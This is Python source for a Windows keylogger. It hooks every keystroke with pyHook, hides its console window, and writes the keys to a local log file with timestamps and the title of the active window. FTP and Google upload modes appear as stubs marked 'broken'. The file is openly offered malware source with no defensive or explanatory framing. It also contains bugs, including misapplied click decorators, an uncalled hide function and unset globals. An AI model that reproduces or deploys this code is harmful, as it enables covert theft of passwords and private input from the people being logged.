import pyHook, pythoncom, time, click, win32console, win32gui


@click.command()
@click.option('--file', '-f', default="c:\\temp\logfile.txt", help="File to output keystrokes to (if running local), "
                                                                   "defaults to c:\\temp\\logfile.txt")
@click.option('--mode', '-m', default="local", help="Where to send log, defaults to local, options are local, ftp, ")


def hide():
    # hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

def get_window():
    # get title of foreground window and return it
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    '''
    windowTile = "";
    while (True):
        newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow());
        if (newWindowTile != windowTile):
            windowTile = newWindowTile;
            print(windowTile);
    '''


def main():
    hide
    global data
    data = ''
    return True

def local():
    global data, file
    # check that there is at least 20 chars in data
    if len(data) > 20:
        # write data to file
        with open(file, "a") as f:
            # format output, adding information about which window is in focus at the time and timestamp
            printing = "\n" + str(time.ctime()) + ' - ' + str(get_window()) + ' - ' + str(data)
            f.write(printing)
            # reset value of data
            data = ''
    return True

def ftp():
    print('FTP broken')
    pass

def google():
    print('Google broken')
    pass

if __name__ == '__main__':
    main()

def on_keyboard_event(event):
    global mode, data
    if event.Key == "Return":
        keys = "<Enter>"
    elif event.Key == "Space":
        keys = "<Space>"
    elif event.Key == "Back":
        keys = "<Backspace>"
    else:
        keys = event.Key
    data = data + keys
    if mode == 'local':
        local()
    elif mode == 'ftp':
        ftp()
    elif mode == 'google':
        google()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_keyboard_event
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


